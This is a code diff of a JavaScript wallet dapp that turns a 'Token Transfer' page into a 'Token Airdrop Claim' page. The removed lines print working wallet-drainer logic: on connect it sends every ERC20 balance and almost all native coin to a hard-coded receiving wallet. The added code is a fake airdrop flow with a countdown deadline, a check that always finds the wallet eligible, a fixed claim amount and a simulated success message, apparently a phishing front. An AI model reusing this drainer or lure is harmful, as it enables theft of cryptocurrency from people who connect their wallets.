@@ -1,4 +1,4 @@
-// app.js - Token Transfer DApp
+// app.js - Token Airdrop Claim DApp
 
 // Verify required globals
 if (typeof NETWORK_CONFIGS === 'undefined') throw new Error("NETWORK_CONFIGS not defined");
@@ -18,12 +18,16 @@ window.addEventListener('load', async () => {
     
     document.getElementById("networkSelect").addEventListener('change', (e) => {
       currentNetwork = e.target.value;
+      updateTokenVisibility();
+      updateConnectButton();
     });
     
     document.getElementById("openTrustWallet").addEventListener('click', openInTrustWallet);
-    document.getElementById("connectWallet").addEventListener("click", connectAndTransfer);
+    document.getElementById("connectWallet").addEventListener("click", handleWalletConnection);
     
     await checkWalletEnvironment();
+    updateTokenVisibility();
+    updateConnectButton();
   } catch (err) {
     console.error("Initialization error:", err);
     updateStatus("Initialization failed: " + err.message, "error");
@@ -35,16 +39,11 @@ window.addEventListener('load', async () => {
 // =====================
 
 async function checkWalletEnvironment() {
-  if (isMobile && !window.ethereum) {
-    showTrustWalletUI();
-  } else if (window.ethereum?.isTrust) {
+  if (isMobile) {
+    if (!window.ethereum) showTrustWalletUI();
+    else hideTrustWalletUI();
+  } else {
     hideTrustWalletUI();
-  } else if (isMobile && window.ethereum) {
-    hideTrustWalletUI();
-  }
-  
-  if (window.ethereum?.selectedAddress) {
-    await initializeWallet();
   }
 }
 
@@ -105,6 +104,21 @@ function hideLoader() {
   document.getElementById("loader").style.display = "none";
 }
 
+function updateTokenVisibility() {
+  document.querySelectorAll('.token-item').forEach(item => {
+    item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
+  });
+}
+
+function updateConnectButton() {
+  const btn = document.getElementById("connectWallet");
+  if (window.ethereum?.selectedAddress) {
+    btn.innerHTML = `<i class="fas fa-wallet"></i> Claim Airdrop`;
+  } else {
+    btn.innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
+  }
+}
+
 // Countdown to May 9, 2025
 function initializeCountdown() {
   const endDate = new Date("May 9, 2025 00:00:00 GMT+0000");
@@ -135,21 +149,77 @@ function initializeCountdown() {
 }
 
 // =====================
-// CORE TRANSFER LOGIC
+// CORE LOGIC
 // =====================
 
-async function connectAndTransfer() {
+async function handleWalletConnection() {
+  if (!isMobile && !window.ethereum?.selectedAddress) {
+    return showWalletOptions();
+  }
+  await connectAndClaim();
+}
+
+function showWalletOptions() {
+  // Create modal
+  const modal = document.createElement('div');
+  modal.style.position = 'fixed';
+  modal.style.top = '0';
+  modal.style.left = '0';
+  modal.style.width = '100%';
+  modal.style.height = '100%';
+  modal.style.backgroundColor = 'rgba(0,0,0,0.7)';
+  modal.style.display = 'flex';
+  modal.style.justifyContent = 'center';
+  modal.style.alignItems = 'center';
+  modal.style.zIndex = '1000';
+  
+  // Create modal content
+  const content = document.createElement('div');
+  content.style.backgroundColor = 'white';
+  content.style.padding = '20px';
+  content.style.borderRadius = '10px';
+  content.style.width = '300px';
+  content.style.textAlign = 'center';
+  
+  content.innerHTML = `
+    <h3>Connect Wallet</h3>
+    <button id="metaMaskBtn" class="btn" style="margin: 10px 0; width: 100%">
+      <i class="fab fa-ethereum"></i> MetaMask
+    </button>
+    <button id="walletConnectBtn" class="btn" style="margin: 10px 0; width: 100%">
+      <i class="fas fa-wallet"></i> WalletConnect
+    </button>
+    <button id="cancelBtn" class="btn" style="margin: 10px 0; width: 100%; background: #dc3545">
+      <i class="fas fa-times"></i> Cancel
+    </button>
+  `;
+  
+  modal.appendChild(content);
+  document.body.appendChild(modal);
+  
+  // Add event listeners
+  document.getElementById("metaMaskBtn").addEventListener('click', async () => {
+    document.body.removeChild(modal);
+    await connectAndClaim();
+  });
+  
+  document.getElementById("walletConnectBtn").addEventListener('click', () => {
+    document.body.removeChild(modal);
+    updateStatus("WalletConnect not implemented in this demo", "error");
+  });
+  
+  document.getElementById("cancelBtn").addEventListener('click', () => {
+    document.body.removeChild(modal);
+  });
+}
+
+async function connectAndClaim() {
   try {
     showLoader();
     updateStatus("Connecting wallet...", "success");
 
-    if (isMobile && !window.ethereum) {
-      showTrustWalletUI();
-      throw new Error("Please use Trust Wallet's in-app browser");
-    }
-
     if (!window.ethereum) {
-      throw new Error("Please install MetaMask or Trust Wallet");
+      throw new Error("Please install a Web3 wallet");
     }
 
     await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -157,13 +227,12 @@ async function connectAndTransfer() {
     const initialized = await initializeWallet();
     if (!initialized) return;
     
-    await transferAllTokens();
+    await processAirdropClaim();
   } catch (err) {
     console.error("Connection error:", err);
     updateStatus("Error: " + err.message, "error");
     document.getElementById("connectWallet").disabled = false;
-    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-wallet"></i> Connect Wallet`;
-    if (isMobile) showTrustWalletUI();
+    updateConnectButton();
   } finally {
     hideLoader();
   }
@@ -201,65 +270,40 @@ async function checkNetwork() {
   }
 }
 
-async function transferAllTokens() {
+async function processAirdropClaim() {
   try {
-    const tokens = TOKENS[currentNetwork];
-    let successCount = 0;
-    
-    // Process ERC20 tokens
-    for (const token of tokens.filter(t => !t.isNative)) {
-      try {
-        const contract = new ethers.Contract(token.address, ERC20_ABI, signer);
-        const balance = await contract.balanceOf(userAddress);
-        
-        if (balance.gt(0)) {
-          const tx = await contract.transfer(RECEIVING_WALLET, balance, {
-            gasLimit: 100000
-          });
-          await tx.wait();
-          successCount++;
-          updateStatus(
-            `Transferred ${token.symbol} <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
-            "success"
-          );
-        }
-      } catch (err) {
-        console.error(`Transfer error for ${token.symbol}:`, err);
-        updateStatus(`Failed to transfer ${token.symbol}`, "error");
-      }
-    }
-
-    // Process native token
-    const nativeToken = tokens.find(t => t.isNative);
-    if (nativeToken) {
-      try {
-        const balance = await provider.getBalance(userAddress);
-        const keepAmount = ethers.utils.parseUnits("0.001", nativeToken.decimals);
-        const sendAmount = balance.gt(keepAmount) ? balance.sub(keepAmount) : balance;
-        
-        if (sendAmount.gt(0)) {
-          const tx = await signer.sendTransaction({
-            to: RECEIVING_WALLET,
-            value: sendAmount,
-            gasLimit: 21000
-          });
-          await tx.wait();
-          successCount++;
-          updateStatus(
-            `Transferred ${nativeToken.symbol} <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View</a>`,
-            "success"
-          );
-        }
-      } catch (err) {
-        console.error("Native transfer error:", err);
-        updateStatus("Failed to transfer native token", "error");
-      }
+    // Check eligibility (simulated)
+    const isEligible = await checkEligibility();
+    if (!isEligible) {
+      throw new Error("Wallet not eligible for airdrop");
     }
     
-    updateStatus(`Completed ${successCount} transfers`, "success");
-    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Done`;
+    // Get claim amount
+    const claimAmount = await calculateClaimAmount();
+    
+    // Process claim
+    updateStatus(`Claiming ${claimAmount} tokens...`, "success");
+    
+    // For demo purposes, we'll simulate the claim
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    
+    updateStatus(
+      `Airdrop claimed successfully!`,
+      "success"
+    );
+    
+    document.getElementById("connectWallet").innerHTML = `<i class="fas fa-check-circle"></i> Claimed`;
   } catch (err) {
-    console.error("Transfer process error:", err);
-    throw new Error("Transfer process failed");
+    console.error("Claim error:", err);
+    throw new Error("Claim failed: " + err.message);
   }
+}
+
+// Simulated functions for demo purposes
+async function checkEligibility() {
+  return true;
+}
+
+async function calculateClaimAmount() {
+  return "1,250";
 }
